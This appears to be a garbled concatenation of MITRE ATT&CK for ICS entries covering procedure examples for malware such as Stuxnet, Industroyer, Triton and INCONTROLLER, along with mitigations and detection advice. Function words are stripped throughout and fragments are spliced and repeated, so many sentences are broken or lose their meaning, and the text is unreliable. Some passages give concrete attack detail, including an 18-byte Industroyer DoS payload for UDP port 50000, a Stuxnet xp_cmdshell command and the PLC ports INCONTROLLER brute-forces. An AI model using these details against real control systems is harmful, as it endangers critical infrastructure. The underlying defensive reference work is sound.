 Ukraine 2015 Incident, [Sandworm Team](https://attack.mitre.org/groups/G0034) blocked reporting messages malicious firmware render communication devices inoperable. (Citation: Electricity Sharing Analysis Center; SANS Industrial Control Systems March 2016) communication sessions remote services authenticated prevent unauthorized access.
 Monitor mismatches protocols expected ports non-HTTP traffic tcp:80). Analyze packet contents detect communications follow expected protocol behavior port used.(Citation: University Birmingham C2) host-based allowlists prevent devices accepting connections unauthorized systems. example, allowlists ensure devices connect master stations management/engineering workstations. (Citation: Department Homeland Security September 2016)
 Ensure permissions restrict project file access engineer technician user accounts.
 [Industroyer](https://attack.mitre.org/software/S0604) attempts connect hardcoded internal proxy TCP 3128 [default Squid proxy]. established, backdoor attempts reach external C2 server internal proxy. (Citation: Dragos June 2017) Ensure unnecessary ports services closed prevent risk discovery potential exploitation.
 Monitor device alarms program downloads, devices produce alarms. encryption firmware considered prevent adversaries identifying vulnerabilities firmware.
 Minimize exposure API calls execution code.
 manipulated I/O image requires analyzing application program running PLC specific data block writes. Detecting requires obtaining analyzing PLC’s application program, device asset management platforms. store data backups user systems critical servers. Ensure backup storage systems hardened separate corporate network prevent compromise.  Maintain exercise incident response plans (Citation: Department Homeland Security October 2009), including management gold-copy back-up images configurations key systems enable quick recovery response adversarial activities impact control, view, availability.
 Segment operational network systems restrict access critical functions predetermined management systems. (Citation: Department Homeland Security September 2016)
 Utilize network allowlists restrict unnecessary connections network devices comm servers, serial ethernet converters) services, devices limits simultaneous sessions support.
 Monitor user accounts logged systems access abnormal access patterns, multiple systems short period time. Correlate login activity remote services unusual behavior malicious suspicious activity. Adversaries learn environment relationships systems Discovery techniques prior attempting Lateral Movement. context adversary procedures background [Remote Services](https://attack.mitre.org/techniques/T1021) applicable sub-techniques. Devices verify firmware properly signed vendor allowing installation.
 Norsk Hydro attempted recover [LockerGoga](https://attack.mitre.org/software/S0372) infection, 160 manufacturing locations switched manual (non-IT driven) operations. Manual operations result loss productivity. (Citation: Kevin Beaumont)(Citation: Hydro) [Dragonfly 2.0](https://attack.mitre.org/groups/G0035) deleted indicators staging target devices uninstalling software, removing event logs, batch scripts, screenshots, registry keys, documents, tools brought target networks. (Citation: Cybersecurity & Infrastructure Security Agency March 2018) Monitor contextual data running process, include environment variables, image name, user/owner, reveal abuse features.  Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior. (Citation: Security Response Center August 2017)Control flow integrity checking identify software exploit occurring. (Citation: Wikipedia)Many protections depend architecture target application binary compatibility software services targeted.
 Perform inline allowlisting automation protocol commands  prevent devices sending unauthorized command reporting messages. Allow/denylist techniques designed sufficient accuracy prevent unintended blocking valid messages.
 Protocols control functions provide authenticity MAC functions digital signatures. not, utilize bump-in-the-wire devices VPNs enforce communication authenticity devices capable supporting legacy controllers, RTUs).
 Provide privileges restriction GUI session control operations (examples include HMI read-only vs. read-write modes). Ensure local users, operators engineers, prioritization remote sessions authority regain control remote session needed. Prevent remote access sessions RDP, VNC) local sessions, ICS control, HMIs.
 field controllers require users authenticate remote local management sessions. authentication mechanisms support [Account Policies](https://attack.mitre.org/mitigations/M0936), [Password Policies](https://attack.mitre.org/mitigations/M0927), [User Account Management](https://attack.mitre.org/mitigations/M0918). Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file possible, determine actions intent. Consult asset management systems understand expected alarm settings. detecting collection centralized repositories monitor newly constructed logon behavior Microsoft's SharePoint configured report access documents.(Citation: SharePoint Logging) Sharepoint audit logging configured report user shares resource.(Citation: Sharepoint Sharing Events) user access logging Atlassian's Confluence configured report access documents AccessLogFilter.(Citation: Atlassian Confluence Logging) Additional log storage analysis infrastructure required robust detection capabilities. context adversary procedures background [Data Repositories](https://attack.mitre.org/techniques/T1213). [INCONTROLLER](https://attack.mitre.org/software/S1045) CGI scripts Omron PLCs modify parameters EtherCat connected servo drives.(Citation: Wylie-22)  Segment control software movement business OT environments directional DMZs. access restricted OT environment. Engineering workstations, including transient cyber assets (TCAs) minimal connectivity external networks, including Internet email, limit extent devices dual-homed multiple networks. (Citation: North America Transmission Forum December 2019)
 Integrity checking transient assets include performing validation booted operating programs TPM-based technologies, Secure Boot Trusted Boot. (Citation: Emerson Exchange) include verifying filesystem changes, programs configuration files stored system, executing processes, libraries, accounts, ports.   (Citation: National Security Agency February 2016)
 sensitive operation architecture process environment encrypted ensure confidentiality restrict access know. (Citation: Keith Stouffer 2015) (Citation: National Institute Standards Technology April 2013)
 3 4 [Stuxnet](https://attack.mitre.org/software/S0603) sends network bursts (done DP_SEND primitive). data frames instructions frequency converter drives. frames records change maximum frequency (the speed motor operate). frequency converter drives consist parameters, remotely configured Profibus. write values parameters changing behavior device. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) [Industroyer](https://attack.mitre.org/software/S0604) SIPROTEC DoS module exploits CVE-2015-5374 vulnerability render Siemens SIPROTEC device unresponsive. vulnerability exploited, target device stops responding commands rebooted manually. (Citation: Anton Cherepanov, ESET June 2017) tool executed sends crafted packets port 50,000 target IP addresses UDP. UDP packet 18 byte payload: 0x11 49 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 9E. (Citation: Anton Cherepanov, ESET June 2017) [INCONTROLLER](https://attack.mitre.org/software/S1045) establish remote connection change operating mode Omron PLCs.(Citation: Dragos-Pipedream)(Citation: Wylie-22)  Restrict unauthorized devices accessing serial comm ports.
 Monitor device communication patterns identify irregular bulk transfers data embedded ICS asset nodes network. Note indicators dependent profile normal operations capabilities industrial automation protocols involved partial program uploads). [Conficker](https://attack.mitre.org/software/S0608) infection nuclear power plant forced facility shutdown security procedures involved events, staff scanning systems regular checks motions putting plant production. (Citation: Catalin Cimpanu April 2016) Utilize out-of-band communication validate integrity data primary channel.
 Enforce strong password requirements prevent password brute force methods lateral movement.
 Utilize out-of-band communication validate integrity data primary channel.
 Provide operators redundant, out-of-band communication support monitoring control operational processes, recovering network outage  (Citation: National Institute Standards Technology April 2013). Out-of-band communication utilize diverse systems technologies minimize common failure modes vulnerabilities communications infrastructure. example, wireless networks 3G, 4G) provide diverse redundant delivery data.
 Segment operational assets management devices based functional role process. Enabling strict isolation critical control operational control environment. (Citation: Karen Scarfone; Paul Hoffman September 2009) (Citation: Keith Stouffer 2015) (Citation: Department Homeland Security September 2016) (Citation: Dwight Anderson 2014) 
 execution PLC stopped violating cycle time limit. [PLC-Blaster](https://attack.mitre.org/software/S1006) implements endless loop triggering error condition PLC impact DoS. (Citation: Spenneberg, Ralf, Maik Brggemann, Hendrik Schwartke March 2016) [Stuxnet](https://attack.mitre.org/software/S0603) modifies Import Address Tables DLLs hook specific APIs project files. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) [ALLANITE](https://attack.mitre.org/groups/G1000) identified collect distribute screenshots ICS systems HMIs. (Citation: Dragos) (Citation: ICS-CERT October 2017) Monitor device alarms produced program uploads occur, devices produce alarms. Monitor unexpected protocols to/from Internet. network traffic content logon session metadata identify login event, Internet-based network flows reliable indicator technique. Monitor newly executed processes binaries involved data destruction activity, SDelete. [Dragonfly 2.0](https://attack.mitre.org/groups/G0035) utilized watering hole attacks gather credentials, compromising websites energy sector organizations access. (Citation: Symantec September 2017) code injected header.php file, redirect visitors adversary controlled IP. (Citation: Cybersecurity & Infrastructure Security Agency March 2018) Segment operational assets management devices based functional role process. Enabling strict isolation critical control operational control environment. (Citation: Karen Scarfone; Paul Hoffman September 2009) (Citation: Keith Stouffer 2015) (Citation: Department Homeland Security September 2016) (Citation: Dwight Anderson 2014) 
 Monitor lack operational process data identify loss communications. detect technique’s execution, provide additional evidence technique complement detections. [Triton](https://attack.mitre.org/software/S1009) reset controller previous TriStation failed write dummy program memory attempt anti-forensics. (Citation: Jos Wetzels January 2018) Ensure embedded controls network devices protected access management, devices unknown hardcoded accounts gain unauthorized access. Perform inline allowlisting automation protocol commands  prevent devices sending unauthorized command reporting messages. Allow/denylist techniques designed sufficient accuracy prevent unintended blocking valid reporting messages.
 Monitor unexpected project files, malicious modification occurs tandem legitimate difficult isolate unintended analyzing file systems modifications. store data backups user systems critical servers. Ensure backup storage systems hardened separate corporate network prevent compromise.  Maintain exercise incident response plans  (Citation: Department Homeland Security October 2009), including management gold-copy back-up images configurations key systems enable quick recovery response adversarial activities impact control, view, availability.
 type attack technique easily mitigated preventive controls based abuse features.
 host-based allowlists prevent devices accepting connections unauthorized systems. example, allowlists ensure devices connect master stations management/engineering workstations. (Citation: Department Homeland Security September 2016)
 Monitor loss network traffic alarms suppressed. loss expected communications network protocols communicate alarm events process data technique used. detect technique’s execution, provide additional evidence technique complement detections. multi-factor authentication possible.
 [Dragonfly 2.0](https://attack.mitre.org/groups/G0035) captured ICS vendor names, reference documents, wiring diagrams, panel layouts process environment. (Citation: Cybersecurity & Infrastructure Security Agency March 2018) Utilize out-of-band communication validate integrity data primary channel.
 Monitor newly executed processes services designed accept remote connections, RDP, Telnet, SSH, VNC. adversary [Valid Accounts](https://attack.mitre.org/techniques/T0859) login perform follow-on actions spawn additional processes user. removal disabling programs features malicious scripts scripting language IDEs, PowerShell, visual studio).
 Develop robust cyber threat intelligence capability determine types levels threat software exploits 0-days organization.
 [Triton](https://attack.mitre.org/software/S1009) leverages previously-unknown vulnerability Tricon MP3008 firmware versions 10.010.4 insecurely-written exploited achieve arbitrary 2-byte write primitive, gain supervisor privileges. (Citation: DHS CISA February 2019) Remote access tools built-in features interact Windows API perform functions typical utilities. example, ChangeServiceConfigW adversary prevent services starting. context adversary procedures background [Service Stop](https://attack.mitre.org/techniques/T1489). Monitor API calls delete alter generated artifacts host system, including logs captured files quarantined malware. field controllers restrict program uploads users engineers, field technician), preferably implementing role-based access mechanism.
 Execution [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) relies user trojanized installer attached email. (Citation: Daavid Hentunen, Antti Tikkanen June 2014) (Citation: Kyle Wilhoit) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level.
 Provide ability verify integrity control logic programs loaded controller. techniques CRCs checksums commonly used, cryptographically strong vulnerable collisions. Preferably cryptographic hash functions SHA-2, SHA-3) used. (Citation: IEC February 2019)
 [PLC-Blaster](https://attack.mitre.org/software/S1006) scans network Siemens S7 PLC devices infect. locates devices checking service listening TCP port 102. (Citation: Spenneberg, Ralf, Maik Brggemann, Hendrik Schwartke March 2016) Monitor file creation conjunction techniques file transfers [Remote Services](https://attack.mitre.org/techniques/T0886)). Authenticate access field controllers authorizing access to, modification of, device's state, logic, programs. Centralized authentication techniques manage field controller accounts ICS.
 process restarts performed timeout condition occurs.
 Unauthorized connections prevented statically defining hosts ports automation protocol connections.
 Authenticateconnections fromsoftware devices prevent unauthorized systems accessing protected management functions.
 Audit integrity PLC application code functionality, manipulation standard function blocks Organizational Blocks) manage execution application logic programs. (Citation: IEC February 2019)
 IP allowlisting user account management ensure data access restricted valid users expected IP ranges mitigate stolen credentials access data.
 [REvil](https://attack.mitre.org/software/S0496) searches Ahnlab autoup.exe service running target injects payload existing process. (Citation: Tom Fakterman August 2019) difficult adversaries advance operation exploitation undiscovered unpatched vulnerabilities sandboxing. types virtualization application microsegmentation mitigate impact types exploitation. Risks additional exploits weaknesses systems exist. (Citation: Dan Goodin March 2017)
 Harden operating controls prevent unknown malicious removable media.
 Monitor network traffic originating unknown/unexpected hardware devices. Local network traffic metadata (such source MAC addressing) helpful identifying transient assets. Segment operational assets management devices based functional role process. Enabling strict isolation critical control operational control environment. (Citation: Karen Scarfone; Paul Hoffman September 2009) (Citation: Keith Stouffer 2015) (Citation: Department Homeland Security September 2016) (Citation: Dwight Anderson 2014) 
 [NotPetya](https://attack.mitre.org/software/S0368) laterally industrial networks SMB service. (Citation: Joe Slowik April 2019) [Industroyer](https://attack.mitre.org/software/S0604) IEC 61850 componentsends domain-specific MMSgetNameListrequest determine logical nodes device supports. searches logical nodes CSW value, device performs circuit breaker switch control function.(Citation: ESET Industroyer)

[Industroyer](https://attack.mitre.org/software/S0604)'s OPC DA module IOPCBrowseServerAddressSpace items strings: ctlSelOn, ctlOperOn, ctlSelOff, ctlOperOff, Pos stVal.(Citation: ESET Industroyer)

[Industroyer](https://attack.mitre.org/software/S0604) IEC 60870-5-104 module includes range mode discover Object Addresses (IOAs) enumerating each.(Citation: ESET Industroyer) Segment networks systems appropriately reduce access critical services communications.
 Devices remote management firmware require authentication allowing changes. authentication mechanisms support [Account Policies](https://attack.mitre.org/mitigations/M0936), [Password Policies](https://attack.mitre.org/mitigations/M0927), [User Account Management](https://attack.mitre.org/mitigations/M0918) Monitor file names mismatched file disk binary's metadata. indicator binary renamed compiled. context adversary procedures background [Masquerading](https://attack.mitre.org/techniques/T1036) applicable sub-techniques. [Triton](https://attack.mitre.org/software/S1009)'s argument-setting inject.bin shellcode program table Tricon executed firmware cycle. (Citation: DHS CISA February 2019) (Citation: Jos Wetzels January 2018) Ukraine 2015 Incident, [Sandworm Team](https://attack.mitre.org/groups/G0034) issued unauthorized commands substation breakers gaining control operator workstations accessing distribution management (DMS) client application. (Citation: Electricity Sharing Analysis Center; SANS Industrial Control Systems March 2016) [Industroyer](https://attack.mitre.org/software/S0604) port configuration file communication ports prevent processes accessing them. block processes operators reporting messages device. (Citation: Anton Cherepanov, ESET June 2017) Perform inline allowlisting automation protocol commands  prevent devices sending unauthorized command reporting messages. Allow/denylist techniques designed sufficient accuracy prevent unintended blocking valid messages.
 host-based allowlists prevent devices accepting connections unauthorized systems. example, allowlists ensure devices connect master stations management/engineering workstations. (Citation: Department Homeland Security September 2016)
 Monitor device alarms devices Firmware Update Mode, devices produce alarms. Perform integrity checks firmware uploading device. Utilize cryptographic hashes verify firmware tampered comparing trusted hash firmware. trusted data sources vendor site) third-party verification service.
 [NotPetya](https://attack.mitre.org/software/S0368) initially infected networks, exploit (particularly SMBv1-targeting MS17-010 vulnerability) spread industrial networks. (Citation: Joe Slowik April 2019) Authenticate access field controllers authorizing access to, modification of, device's state, logic, programs. Centralized authentication techniques manage field controller accounts ICS.
 [INCONTROLLER](https://attack.mitre.org/software/S1045)  brute force password-based authentication Schneider PLCs  CODESYS protocol (UDP port 1740).(Citation: CISA-AA22-103A)

 [INCONTROLLER](https://attack.mitre.org/software/S1045)  perform brute force guessing passwords OPC servers predefined list passwords.(Citation: CISA-AA22-103A)(Citation: Wylie-22)  [INCONTROLLER](https://attack.mitre.org/software/S1045) perform UDP multicast scan UDP port 27127 identify Schneider PLCs port NetManage protocol.(Citation: Dragos-Pipedream)(Citation: Wylie-22)

[INCONTROLLER](https://attack.mitre.org/software/S1045) FINS (Factory Interface Network Service) protocol scan MAC address Omron devices.(Citation: CISA-AA22-103A)(Citation: Wylie-22)

[INCONTROLLER](https://attack.mitre.org/software/S1045) ability perform scans TCP port 4840 identify devices running OPC servers.(Citation: Wylie-22) Monitor executed processes (such ipconfig/ifconfig arp) arguments details network configuration settings, IP MAC addresses. monitor executed processes attempt listing network connections compromised accessing remote systems querying network. [Industroyer](https://attack.mitre.org/software/S0604) capability service itself, login user service user. (Citation: Anton Cherepanov, ESET June 2017) Segment operational network systems restrict access critical functions predetermined management systems. (Citation: Department Homeland Security September 2016)
 Monitor API calls install hook procedure, SetWindowsHookEx SetWinEventHook functions.(Citation: Hook Overview)(Citation: Volatility Detecting Hooks Sept 2012) analyzing hook chains (which hold pointers hook procedures type hook) tools(Citation: Volatility Detecting Hooks Sept 2012)(Citation: PreKageo Winhook Jul 2011)(Citation: Jay GetHooks Sept 2011) programmatically examining internal kernel structures.(Citation: Zairon Hooking Dec 2006)(Citation: EyeofRa Detecting Hooking June 2017) [ALLANITE](https://attack.mitre.org/groups/G1000) utilized spear phishing gain access energy sector environments. (Citation: Jeff Jones 2018) Ensure proper process file permissions inhibit adversaries disabling interfering critical services.
 Perform inline allowlisting automation protocol commands  prevent devices sending unauthorized command reporting messages. Allow/denylist techniques designed sufficient accuracy prevent unintended blocking valid messages.
 devices systems changes, including administrative functions, require authentication. access management technologies enforce authorization management interface access attempts, device inherently provide strong authentication authorization functions.
 Monitor executed commands arguments services designed accept remote graphical connections, RDP VNC. [Remote Services](https://attack.mitre.org/techniques/T0886) [Valid Accounts](https://attack.mitre.org/techniques/T0859) access host’s GUI. Monitor ICS automation protocols anomalies reading tag data, assets functions, volume timing, unusual queried. protocols provide multiple achieve result functions with/without acknowledgment functions operate single vs. multiple points). Monitor functions used. [Duqu](https://attack.mitre.org/software/S0038) downloads additional modules collection data repositories. modules named: infostealer 1, infostealer 2 reconnaissance. (Citation: Symantec) mitigations include minimizing distribution/storage obfuscating facility coverterms, codenames).  support critical engineering, maintenance, operational functions, therefore, feasible implement.
 Provide ability verify integrity control logic programs loaded controller. techniques CRCs checksums commonly used, cryptographically strong vulnerable collisions. Preferably cryptographic hash functions SHA-2, SHA-3) used. (Citation: IEC February 2019)
 Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. store data backups user systems critical servers. Ensure backup storage systems hardened separate corporate network prevent compromise.  Maintain exercise incident response plans  (Citation: Department Homeland Security October 2009), including management gold-copy back-up images configurations key systems enable quick recovery response adversarial activities impact control, view, availability.
 authorized personnel change settings alarms.
 field controllers restrict modification programs users engineers, field technician), preferably implementing role-based access mechanism.
 Monitor Windows Registry values delete alter generated artifacts host system, including logs captured files quarantined malware. context adversary procedures background [Indicator Removal](https://attack.mitre.org/techniques/T1070) applicable sub-techniques. [Stuxnet](https://attack.mitre.org/software/S0603) store execute SQL code extract execute Stuxnet saved CAB file xp_cmdshell command: `set @s = master..xp _ cmdshell extrac32 /y +@t+ +@t+x; exec(@s);` (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Monitor contextual file data signs deletion alter generated artifacts host system, including logs captured files quarantined malware. Monitor network traffic hardcoded credential protocols unencrypted authentication. Utilize central storage servers critical operations historians) remote backups. outstations, local redundant storage event recorders. backup control platforms, preferably hot-standbys respond data destruction events. (Citation: National Institute Standards Technology April 2013)
 Monitor analyze traffic flows follow expected protocol standards traffic flows extraneous packets belong established flows    , gratuitous anomalous traffic patterns). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns monitor anomalies files initiate connections respective protocol(s)). Install anti-virus software workstation transient assets external access, web, email, remote file shares.
 remote services require strong authentication providing user access.
 [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) RAT distributed trojanized installers planted compromised vendor sites. (Citation: Daavid Hentunen, Antti Tikkanen June 2014) Protocols control functions provide authenticity MAC functions digital signatures. not, utilize bump-in-the-wire devices VPNs enforce communication authenticity devices capable supporting legacy controllers, RTUs).
 Monitor newly constructed files spearphishing emails malicious attachment attempt gain access victim systems. [REvil](https://attack.mitre.org/software/S0496) sends exfiltrated data victims HTTPS POST messages C2 system. (Citation: McAfee Labs October 2019) (Citation: SecureWorks September 2019) Utilize network allowlists restrict unnecessary connections network devices comm servers, serial ethernet converters) services, devices limits simultaneous sessions support.
 Regularly scan externally facing systems vulnerabilities establish procedures rapidly patch systems critical vulnerabilities discovered scanning public disclosure.
 [PLC-Blaster](https://attack.mitre.org/software/S1006) manipulate outputs PLC. POU POKE process image modified. (Citation: Spenneberg, Ralf, Maik Brggemann, Hendrik Schwartke March 2016) Monitor processes command-line arguments critical processes terminated running. context adversary procedures background [Service Stop](https://attack.mitre.org/techniques/T1489). Hot-standbys diverse locations ensure continued operations compromised unavailable. network layer, protocols Parallel Redundancy Protocol simultaneously redundant diverse communication local network. (Citation: M. Rentschler H. Heine)
 [Triton](https://attack.mitre.org/software/S1009) communicates Triconex controllers custom component framework written Python. modules implement TriStation communication protocol supporting components separate file -- library.zip -- main script employs functionality compiled standalone py2exe Windows executable -- trilog.exe  includes Python environment. (Citation: DHS CISA February 2019) Monitor protocol functions program download modification. Program downloads observable ICS automation protocols remote management protocols. Monitor network traffic default credential protocols unencrypted authentication. [Conficker](https://attack.mitre.org/software/S0608) exploits Windows drive shares. infected computer, [Conficker](https://attack.mitre.org/software/S0608) automatically copies visible drive shares computers network. (Citation: Symantec June 2015) Nuclear power plant officials suspect brought [Conficker](https://attack.mitre.org/software/S0608) accident USB thumb drive, computers power plant's facility. (Citation: Catalin Cimpanu April 2016) [TEMP.Veles](https://attack.mitre.org/groups/G0088) utilized remote desktop protocol (RDP) jump boxes ICS environment. (Citation: Dragos December 2017) user training bring awareness common phishing spearphishing techniques raise suspicion malicious events.
 protect MITM, authentication mechanisms send credentials network plaintext implement mechanisms prevent replay attacks (such nonces timestamps). Challenge-response based authentication techniques send credentials network provide protection MITM.
 [NotPetya](https://attack.mitre.org/software/S0368) disrupted manufacturing facilities supplying vaccines, halt production inability meet demand specific vaccines. (Citation: David Voreacos, Katherine Chinglinsky, Riley Griffin December 2019) Devices provide user access underlying operating installation custom software monitor OS API execution. Monitoring API calls generate data defense collected specific circumstances, benign API functions common difficult distinguish malicious behavior. Correlation events behavior surrounding API function calls API monitoring provide additional context event assist determining malicious behavior. [APT33](https://attack.mitre.org/groups/G0064) utilized PowerShell scripts establish command control install files execution. (Citation: Symantec March 2019) (Citation: Dragos) Monitor executed commands arguments attempt manipulate features artifacts legitimate benign users security tools.(Citation: Twitter ItsReallyNick Masquerading Update) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific C2 protocol adversary tool malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: Gardiner, J.,  Cova, M., Nagaraja, February 2014)
 [Triton](https://attack.mitre.org/software/S1009) ability halt program TriStation protocol. TsHi.py instances halt functions executed. (Citation: MDudek-ICS) ICS environments typically statically defined devices, minimize discovery protocols DHCP, LLDP) discovery functions automation protocols. (Citation: D. Parsons D. Wylie September 2019) (Citation: Colin Gray) Examples automation protocols discovery capabilities include OPC Device Discovery  (Citation: Josh Rinaldi April 2016), BACnet  (Citation: Aditya Sood July 2019), Ethernet/IP. (Citation: Langner November 2018)
 Execution prevention block malicious software accessing protected resources command interface.
 APIs perform execution, hosted embedded controllers PLCs), provide adequate authorization enforcement user access. Minimize user's access required API calls. (Citation: MITRE June 2020)
 Authenticateconnections fromsoftware devices prevent unauthorized systems accessing protected management functions.
 Monitor unusual processes internal network connections creating files on-system suspicious.  [Oldsmar Treatment Plant Intrusion](https://attack.mitre.org/campaigns/C0009), threat actors utilized operator HMI interface graphical user interface. action led operator detection adversary screen.(Citation: Pinellas County Sheriffs Office February 2021) Monitor network traffic originating unknown/unexpected hosts. Local network traffic metadata (such source MAC addressing) usage network management protocols DHCP helpful identifying hardware. context adversary procedures background [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) applicable sub-techniques. Monitor asset management systems device configuration understand expected parameter settings. Monitor ICS automation network protocols functions reading asset’s operating mode. cases, multiple detect device’s operating mode, typically operational environment. Monitor operating mode checked unexpected ways. Monitor device alarms program changed, devices produce alarms. [Duqu](https://attack.mitre.org/software/S0038)'s purpose gather intelligence data assets entities industrial infrastructure manufacturers, industrial sector, easily conduct future attack party.(Citation: Symantec) field controllers require users authenticate remote local management sessions. authentication mechanisms support [Account Policies](https://attack.mitre.org/mitigations/M0936), [Password Policies](https://attack.mitre.org/mitigations/M0927), [User Account Management](https://attack.mitre.org/mitigations/M0918). Segment control software movement business OT environments directional DMZs. access restricted OT environment. Engineering workstations, including transient cyber assets (TCAs) minimal connectivity external networks, including Internet email, limit extent devices dual-homed multiple networks. (Citation: North America Transmission Forum December 2019)
 [Flame](https://attack.mitre.org/software/S0143) collect AutoCAD design data visio diagrams documents operational information. (Citation: Kevin Savage Branko Spasojevic) Monitor newly constructed web-based network connections malicious suspicious destinations destinations attributed phishing campaigns). correlation process monitoring command detect anomalous processes execution command arguments monitor anomalies files initiate network connections unusual connections initiated regsvr32.exe, rundll.exe, SCF, HTA, MSI, DLLs, msiexec.exe).  Norsk Hydro's production systems impacted [LockerGoga](https://attack.mitre.org/software/S0372) infection. loss view forced company switch manual operations. (Citation: Kevin Beaumont) (Citation: Hydro) techniques enable spoofing reporting message. Monitor LLMNR/NBT-NS poisoning services/daemons enable technique. context adversary procedures background [LLMNR/NBT-NS Poisoning SMB Relay](https://attack.mitre.org/techniques/T1557/001). Protocols device management authenticate network messages prevent unauthorized changes.
 Traffic anonymity networks C2 infrastructure blocked network block lists. blocking circumvented techniques likeDomain Fronting.
 [INCONTROLLER](https://attack.mitre.org/software/S1045) CODESYS protocol download programs Schneider PLCs.(Citation: Wylie-22)(Citation: Brubaker-Incontroller) 

[INCONTROLLER](https://attack.mitre.org/software/S1045) modified program logic Omron PLCs program download backup transfer functions server.(Citation: Wylie-22)  removing restricting features unnecessary asset's intended function control environment.
 Networking devices switches log client devices connect SNMP notifications). Monitor logs documenting network connection status determine connection occurred, including addresses IP, MAC) devices network. Monitor executed commands arguments abnormal usage utilities command-line arguments support remote transfer files. [Industroyer](https://attack.mitre.org/software/S0604) toggles breakers utilizing unauthorized command messages. (Citation: Anton Cherepanov, ESET June 2017) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent. [Stuxnet](https://attack.mitre.org/software/S0603)'s infection sequence consists code blocks data blocks downloaded PLC alter behavior. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Ensure devices alternative method communicating event valid port unavailable.
 Monitor network traffic suspicious email attachments. correlation process monitoring command detect anomalous processes execution command arguments traffic patterns monitor anomalies files initiate connections respective protocol(s)). proxies review content emails including sender information, headers, attachments malicious content. Monitor anomalies discovery ICS functions, including devices functions functions outstations. Note ICS protocols broadcast multicast functionality, produce false positives. monitor hosts enumerating network connected resources non-ICS enterprise protocols. Authenticateconnections fromsoftware devices prevent unauthorized systems accessing protected management functions.
 Monitor executed commands arguments services designed accept remote connections, RDP, Telnet, SSH, VNC. adversary perform actions [Valid Accounts](https://attack.mitre.org/techniques/T0859). Devices remote management firmware require authentication allowing changes. authentication mechanisms support [Account Policies](https://attack.mitre.org/mitigations/M0936), [Password Policies](https://attack.mitre.org/mitigations/M0927), [User Account Management](https://attack.mitre.org/mitigations/M0918). Monitor API calls (such GetAdaptersInfo() GetIpNetTable()) gather details network configuration settings, IP MAC addresses. monitor API calls attempt listing network connections compromised accessing remote systems querying network. context adversary procedures background [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) [System Network Connections Discovery](https://attack.mitre.org/techniques/T1049). Protocols control functions provide authenticity MAC functions digital signatures. not, utilize bump-in-the-wire devices VPNs enforce communication authenticity devices capable supporting legacy controllers, RTUs).
 Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific protocol adversary tool malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: Gardiner, J.,  Cova, M., Nagaraja, February 2014)
 Monitor executed commands arguments actions collect internal data. Monitor application logging, messaging, artifacts result  Denial Service (DoS) attacks degrade block availability services users. addition network level detections, endpoint logging instrumentation detection. Monitor asset application logs provide requests tags. anomalies reading tag data, assets functions, volume timing, unusual queried. devices provide multiple achieve result functions with/without acknowledgment functions operate single vs. multiple points). Monitor functions used. Utilize network allowlists restrict unnecessary connections network devices comm servers, serial ethernet converters) services, devices limits simultaneous sessions support.
 Limit privileges user accounts designated administrators engineers interact alarm management alarm configuration thresholds.
 difficult adversaries advance operation exploitation undiscovered unpatched vulnerabilities sandboxing. types virtualization application microsegmentation mitigate impact types exploitation. Risks additional exploits weaknesses systems exist. (Citation: Dan Goodin March 2017)
 Statically defined ARP entries prevent manipulation sniffing switched network traffic, MitM techniques depend sending spoofed ARP messages manipulate network host's dynamic ARP tables.
 Protocols control functions provide authenticity MAC functions digital signatures. not, utilize bump-in-the-wire devices VPNs enforce communication authenticity devices capable supporting legacy controllers, RTUs).
 [INCONTROLLER](https://attack.mitre.org/software/S1045) includes library creates Modbus connections device request device ID.(Citation: CISA-AA22-103A)(Citation: Wylie-22)  Consult asset management systems understand expected program versions. Devices provide user access underlying operating installation custom software monitor OS API execution. Monitoring API calls generate data defense collected specific circumstances, benign API functions common difficult distinguish malicious behavior. Correlation events behavior surrounding API function calls API monitoring provide additional context event assist determining malicious behavior. Users trained identify social engineering techniques spearphishing emails.
 [Stuxnet](https://attack.mitre.org/software/S0603) self-replicate spread removable drives. insider unknown party, contractor, brought removable media target environment. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) earliest version Stuxnet relied physical installation, infecting target systems infected configuration file carried USB stick opened. (Citation: Ralph Langner November 2013) Monitor Windows registry deleted alter generated artifacts host system, including logs captured files quarantined malware. context adversary procedures background [Indicator Removal](https://attack.mitre.org/techniques/T1070) applicable sub-techniques. [Industroyer](https://attack.mitre.org/software/S0604)'s OPC IEC 61850 protocol modules include ability send stVal requests read status operational variables. (Citation: Anton Cherepanov, ESET June 2017) [Industroyer](https://attack.mitre.org/software/S0604) SPIROTEC DoS module victim device firmware update mode. legitimate normal circumstances, adversary prevent SPIROTEC performing designed protective functions. result normal safeguards disabled, leaving unprotected link electric transmission. (Citation: Joe Slowik August 2019) Monitor newly constructed drive letters mount removable media. [Industroyer](https://attack.mitre.org/software/S0604) IEC 61850 module enumerates connected network adapters determine TCP/IP subnet masks. (Citation: Anton Cherepanov, ESET June 2017) Network allowlists implemented host-based files host files external connections IP address, MAC address, port, protocol) device.
